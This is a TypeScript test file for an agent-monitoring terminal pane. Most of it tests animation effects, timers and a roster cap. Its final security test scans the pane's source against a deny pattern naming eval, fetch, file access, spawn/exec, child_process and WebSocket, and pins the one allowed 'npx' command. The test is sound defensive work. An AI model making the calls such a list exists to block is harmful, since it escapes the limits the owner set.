  expect(t0[1].filter((c: any) => c.ch === '▶')).toHaveLength(1);
  expect([t0[1].findIndex((c: any) => c.ch === '▶'), t1[1].findIndex((c: any) => c.ch === '▶')]).toEqual([0, 3]);
  expect(train(cells, 500)).toEqual(t1);
  expect(train(cells.map((c) => ({ ...c, state: 'todo' })), 0).flat().every((c: any) => c.ch === ' ')).toBe(true);
});

// Phase 08.8.1 L-01: under the mission preset the first row of the ticket tab is the heartbeat and the current stage cell holds the train while an agent runs; lively draws neither
it('risk:regression the mission preset draws the heartbeat and the train on the ticket tab (L-01)', async () => {
  const heart = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.texts().find((x) => /^[─╱╲‾▇]{20,}$/.test(x));
  const trainOf = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.texts().find((x) => /^[━┄]*▶[━┄]*$/.test(x));
  const mission = await paneWith(MOVING, (x) => {
    x.columns = 100;
    void x.store.set('settings', { v: 1, motion: 'mission', effects: {} });
  });
  // an idle pane draws still colours: no heartbeat, no train
  expect(heart(mission)).toBeUndefined();
  const T = Date.now();
  const clock = vi.spyOn(Date, 'now').mockReturnValue(T);
  try {
    await startExecutor(mission);
    const frame = async (ms: number): Promise<{ heart: string | undefined; train: string | undefined }> => {
      clock.mockReturnValue(T + ms);
      await mission.$.ui.invalidate('ui.render');
      return { heart: heart(mission), train: trainOf(mission) };
    };
    const a = await frame(0);
    expect(a.heart).toBeDefined();
    // the first row under the tab buttons is the heartbeat line, every cell its own coloured text
    const top = (mission.tree()?.props.children as any[])[1];
    expect(top.type).toBe('Text');
    expect(flat(top.props.children)).toBe(a.heart);
    expect(top.props.children.every((c: any) => /^#[0-9a-f]{6}$/.test(c.props.color))).toBe(true);
    // the current stage cell holds the train: as wide as its label
    expect(a.train).toHaveLength('build 1/3'.length);
    const b = await frame(400);
    expect(b.heart).not.toBe(a.heart);
    expect(b.train).not.toBe(a.train);
  } finally {
    clock.mockRestore();
  }
  // lively draws neither
  const lively = await paneWith(MOVING, (x) => void (x.columns = 100));
  await startExecutor(lively);
  expect(heart(lively)).toBeUndefined();
  expect(trainOf(lively)).toBeUndefined();
});

// ---- Phase 08.8.1-09 task 2: orbiting marks, the log ticker, twelve switches, the waiting blink and the failure flash ----

// Phase 08.8.1 L-01 L-06: orbit, ticker, the blink and the failure flash are pure functions of the frame time; the blink ends for good after ten minutes of waiting
it('risk:parsing orbit ticker and blink are pure functions of the frame time (L-01)', async () => {
  const { orbit, ticker, blinkOn, flashOn, BLINK_MS, FLASH_MS } = await loadView();
  // the orbit: four marks, eight steps a second, one step further for each next agent
  expect([0, 125, 250, 375, 500].map((t) => orbit(t, 0))).toEqual([...'◜◝◞◟◜']);
  expect([orbit(0, 1), orbit(0, 5), orbit(0, 2)]).toEqual(['◝', '◝', '◞']);
  // the ticker: exactly `width` characters of the joined lines that scroll with the time, the same for the same time
  const lines = ['3s commit one', '9s report two'];
  const a = ticker(lines, 20, 0);
  const b = ticker(lines, 20, 500);
  expect([...a]).toHaveLength(20);
  expect([...b]).toHaveLength(20);
  expect(b).not.toBe(a);
  expect(ticker(lines, 20, 500)).toBe(b);
  expect([...ticker([], 10, 0)]).toHaveLength(10);
  expect([...ticker(['x'], 40, 700)]).toHaveLength(40);
  // control and bidi characters in a line never reach the scrolled text
  const bad = [...ticker(['a\u202eb\u0007c\u001bd'], 30, 0)].filter((ch) => {
    const c = ch.codePointAt(0) as number;
    return c < 0x20 || (c >= 0x7f && c <= 0x9f) || (c >= 0x202a && c <= 0x202e);
  });
  expect(bad).toEqual([]);
  // the blink: lit and dark twice a second, then steady lit once the wait passes ten minutes
  const since = 1_000_000;
  expect([0, 250, 500, 750, 1000].map((d) => blinkOn(since + d, since, since + d))).toEqual([true, true, false, false, true]);
  expect(BLINK_MS).toBe(600_000);
  expect(blinkOn(since + BLINK_MS - 500, since, since + BLINK_MS - 500)).toBe(false);
  expect(blinkOn(since + BLINK_MS + 500, since, since + BLINK_MS + 500)).toBe(true);
  // the failure flash: six toggles a second for FLASH_MS from the time the failure appeared, then none
  expect(FLASH_MS).toBe(1500);
  expect([0, 100, 200, 300, 1300, 1500, 3000].map((d) => flashOn(5000 + d, 5000))).toEqual([true, true, false, false, false, false, false]);
  expect(flashOn(4000, 5000)).toBe(false);
  expect(flashOn(5000, undefined)).toBe(false);
});

const GATE_RED = { kind: 'gate', text: 'gate done FAIL: red', fail: true };
// the diamond of the waiting line, and the border colour of the failure box
const diamondOf = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.texts().find((x) => /^[◆◇]$/.test(x));
const failBorder = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.nodes('Box').find((b) => b.props.borderStyle === 'round' && textsIn(b)[0] === 'Gate failed')?.props.borderColor;

// Phase 08.8.1 D-03 L-06: while the main loop waits for the person the diamond blinks on the frame timer for ten minutes and then stays lit with no timer left; a newly appearing failed gate flashes the failure box red for 1.5 seconds and a shown failure does not flash again; motion off blinks and flashes nothing and starts no timer
it('risk:resource the waiting blink and the failure flash run on the frame timer and stop on time (D-03 L-06)', async () => {
  const period = await framePeriod();
  const T = 1_800_000_000_000;
  const clock = vi.spyOn(Date, 'now').mockReturnValue(T);
  const at = async (h: Awaited<ReturnType<typeof host>>, ms: number): Promise<void> => {
    clock.mockReturnValue(T + ms);
    await h.$.ui.invalidate('ui.render');
  };
  const waitingText = (h: Awaited<ReturnType<typeof host>>): string => h.texts().find((x) => x.startsWith('Waiting for you')) as string;
  try {
    // the blink
    const h = await paneWith(MOVING);
    expect(liveTimers(h)).toEqual([]);
    await h.fire('turn.complete', { reason: 'answer', answer: 'ok' });
    await vi.waitFor(() => expect(h.texts().some((x) => x.startsWith('Waiting for you'))).toBe(true));
    expect(liveTimers(h)).toEqual([period]);
    const frames: { diamond: string | undefined; color: string }[] = [];
    for (const ms of [0, 250, 500, 750]) {
      await at(h, ms);
      frames.push({ diamond: diamondOf(h), color: h.cell(waitingText(h)).text.color });
    }
    expect(frames.map((f) => f.diamond)).toEqual(['◆', '◆', '◇', '◇']);
    // the line glows toward white while it blinks
    expect(frames[1].color).not.toBe(frames[0].color);
    expect(liveTimers(h)).toEqual([period]);
    // after ten minutes the diamond stays lit in the waiting colour and no timer is left
    await at(h, 600_500);
    expect(diamondOf(h)).toBe('◆');
    expect(h.cell(waitingText(h)).text.color).toBe('#e07a4f');
    expect(liveTimers(h)).toEqual([]);
    await h.fire('turn.start', { turnId: 'next', text: 'yes' });
    expect(liveTimers(h)).toEqual([]);
    // the failure flash
    clock.mockReturnValue(T);
    const f = await paneWith(MOVING);
    expect(liveTimers(f)).toEqual([]);
    const failing = { ...MOVING, log: [{ at: Math.floor(T / 1000) - 5, ...GATE_RED }] };
    await reshow(f, failing, 'p1');
    expect(liveTimers(f)).toEqual([period]);
    const borders: (string | undefined)[] = [];
    for (const ms of [0, 200, 400]) {
      await at(f, ms);
      borders.push(failBorder(f));
    }
    expect(borders).toEqual(['red', '#ff6b6b', 'red']);
    await at(f, 1600);
    expect(failBorder(f)).toBe('#ff6b6b');
    expect(liveTimers(f)).toEqual([]);
    // a failure already shown does not flash again, on a redraw or on the next show of the same entry
    await at(f, 5000);
    expect(failBorder(f)).toBe('#ff6b6b');
    await reshow(f, failing, 'p2');
    expect(failBorder(f)).toBe('#ff6b6b');
    expect(liveTimers(f)).toEqual([]);
    // motion off: no blink, no flash and no timer, the diamond lit and the box in the failure colour
    clock.mockReturnValue(T);
    const off = await paneWith(MOVING, (x) => void x.store.set('settings', { v: 1, motion: 'off', effects: {} }));
    await off.fire('turn.complete', { reason: 'answer' });
    await vi.waitFor(() => expect(off.texts().some((x) => x.startsWith('Waiting for you'))).toBe(true));
    expect(liveTimers(off)).toEqual([]);
    for (const ms of [0, 500]) {
      await at(off, ms);
      expect(diamondOf(off)).toBe('◆');
    }
    off.settle({ stdout: claimed });
    await vi.waitFor(() => expect(off.inflight()).toBe(1));
    off.settle({ stdout: JSON.stringify(detailOf(failing)) });
    await vi.waitFor(() => expect(off.inflight()).toBe(0));
    await at(off, 0);
    expect(failBorder(off)).toBe('#ff6b6b');
    expect(liveTimers(off)).toEqual([]);
  } finally {
    clock.mockRestore();
  }
});

// Phase 08.8.1 L-01 D-03: every one of the twelve effects is its own switch: alone under mine it draws that effect and no other; an effect the probe cut reads cut for speed in the settings view and is never drawn
it('risk:regression every one of the twelve effects is its own switch and a cut effect is never drawn (L-01 D-03)', async () => {
  const { EFFECTS, effectsOf, ticketView, agentRows, agentMotion, settingsOf } = await loadView();
  expect(EFFECTS.map((e: any) => e.key).sort()).toEqual(['breathe', 'comet', 'confetti', 'ecg', 'eq', 'flow', 'orbit', 'roll', 'shimmer', 'ticker', 'train', 'typing']);
  const T = 1_800_000_000_000;
  const ticket = { id: 'ST-1', state: { ticket: detailOf({ ...planOf(2), log: [{ at: T / 1000 - 3, kind: 'commit', text: 'build: x' }, { at: T / 1000 - 9, kind: 'report', text: 'executor report' }] }) } };
  const roster = [{ key: 'a1', type: 'accord-executor', startTime: T - 65000, running: true, tool: 'Edit', toolAt: T - 1000 }];
  const frame = (key: string, ms: number): { view: any; look: any } => {
    const settings = settingsOf({ v: 1, motion: 'mine', effects: key === 'none' ? {} : { [key]: true } });
    const effects = effectsOf(settings);
    const view = ticketView({ ticket, now: Math.floor((T + ms) / 1000), nowMs: T + ms, agents: roster, settings, motion: { effects, burst: { at: T, seed: 3 }, columns: 100 } });
    const row = agentRows(roster, T + ms)[0];
    return { view, look: agentMotion(row, roster[0], effects, T + ms, 0) };
  };
  const drawn = (key: string): string[] => {
    const a = frame(key, 100);
    const b = frame(key, 350);
    const differ = (x: unknown, y: unknown): boolean => JSON.stringify(x) !== JSON.stringify(y);
    const seen: Record<string, boolean> = {
      shimmer: a.view.now[0].run !== undefined,
      flow: differ(a.view.titleRun, b.view.titleRun),
      comet: a.view.barRow !== undefined && differ(a.view.barRow.cells, b.view.barRow.cells),
      eq: a.look.eq !== undefined,
      typing: a.look.typed !== undefined,
      confetti: a.view.sparks !== undefined,
      roll: a.view.barRow !== undefined && a.view.barRow.counter !== a.view.progress.valueText,
      ecg: a.view.heartbeat !== undefined,
      train: a.view.train !== undefined,
      orbit: '◜◝◞◟'.includes(a.look.mark),
      ticker: a.view.log?.[0]?.ticker !== undefined,
      breathe: differ(a.view.criteria.map((c: any) => c.idColor), b.view.criteria.map((c: any) => c.idColor)),
    };
    return Object.keys(seen).filter((k) => seen[k]);
  };
  for (const { key } of EFFECTS) expect(drawn(key), key).toEqual([key]);
  // nothing switched on draws none of them
  expect(drawn('none')).toEqual([]);
  // an effect the probe cut: its switch reads cut for speed and it is never drawn
  viewPatch = (text) => text.replace('export const CUT_EFFECTS = [];', "export const CUT_EFFECTS = ['ticker'];");
  const cut = await paneWith(MOVING, (x) => void x.store.set('settings', { v: 1, motion: 'mine', effects: { ticker: true, orbit: true } }));
  const patched = await loadView();
  viewPatch = undefined;
  expect([...patched.effectsOf(patched.settingsOf({ v: 1, motion: 'mine', effects: { ticker: true, orbit: true } }))]).toEqual(['orbit']);
  press(cut, 'settings');
  await vi.waitFor(() => expect(cut.texts().some((x) => x.includes('cut for speed'))).toBe(true));
  expect(cut.texts().filter((x) => x.includes('cut for speed'))).toEqual(['[ ] scrolling log ticker · cut for speed']);
  expect(cut.texts()).toContain('[x] orbiting agent marks');
});

// ---- Phase 08.8.1-10: tests the audit of Phase 08.7 found missing ----

// Phase 08.8.1 audit of Phase 08.7 (T-08.7-14, D-02): subagent event spam never grows the roster past fifty, so the running count in the tab label stops at fifty and the oldest start goes first.
it('risk:resource the agent roster holds at most fifty accord agents however many subagents start (D-02)', async () => {
  const h = await claimedPane();
  h.agents = Array.from({ length: 60 }, (_, i) => agentOf('a' + i, 'accord-executor', { startTime: Date.now() - 600000 + i }));
  for (let i = 0; i < 60; i++) await h.fire('turn.start', subStart('a' + i));
  expect(tabs(h)['tab:ticket'].label).toContain('◐50');
  expect(tabs(h)['tab:ticket'].label).not.toContain('◐60');
});

// Phase 08.8.1 audit of Phase 08.7 (T-08.7-15, D-02): the pane holds no logic or gate beyond display. Read from its source: it imports nothing but view.js, reads no file, makes no network call, reaches the
// host only through the listed nouns and runs only the pinned `npx` for `dashboard` and `show`. A person who widens the pane widens this list on purpose, with the owner's say.
it('risk:security the pane reaches the host only through the display nouns and runs only the pinned npx show and dashboard (D-02)', () => {
  const code = (name: string): string =>
    readFileSync(new URL('../panel/' + name, import.meta.url), 'utf8')
      .split('\n')
      .filter((l) => !/^\s*\/\//.test(l))
      .join('\n');
  const reg = code('register.js');
  const view = code('view.js');
  for (const src of [reg, view]) expect(src).not.toMatch(/\b(?:require|eval|fetch|readFile|readFileSync|writeFile|writeFileSync|spawn|execFile|execSync)\s*\(|child_process|XMLHttpRequest|WebSocket|from\s+['"]node:|\bimport\s*\(/);
  expect([...reg.matchAll(/^import\b[^;]*?from\s+'([^']+)'/gm)].map((m) => m[1])).toEqual(['./view.js']);
  expect(view).not.toMatch(/^import\b/m);
  const nouns = [...new Set([...reg.matchAll(/\$\.([a-z]+)\.([a-zA-Z]+)/g)].map((m) => `${m[1]}.${m[2]}`))].sort();
  expect(nouns).toEqual(['agent.list', 'clock.after', 'clock.every', 'command.register', 'command.run', 'process.run', 'session.surfaces', 'store.get', 'store.set', 'ui.invalidate', 'ui.open', 'ui.panes', 'ui.resolve', 'ui.toast']);
  const runs = [...reg.matchAll(/\$\.process\.run\(([^)]*)/g)].map((m) => m[1]);
  expect(runs).toHaveLength(2);
  for (const argv of runs) expect(argv).toMatch(/^\['npx', '--yes', 'ACCORD_PACKAGE_SPEC', '(?:dashboard|show)'/);
});
